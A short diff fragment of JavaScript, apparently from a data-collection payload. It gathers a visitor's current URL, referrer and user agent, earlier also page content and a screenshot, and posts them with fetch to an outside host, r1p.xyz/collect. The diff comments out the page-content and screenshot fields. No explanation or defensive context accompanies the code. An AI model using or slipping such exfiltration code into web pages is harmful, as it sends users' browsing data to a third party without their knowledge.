@@ -37,8 +37,8 @@
             currentUrl,
             referer,
             userAgent,
-            pageContent,
-            screenshot
+           /* pageContent,
+            screenshot*/
         };
 
         await fetch('https://r1p.xyz/collect', {
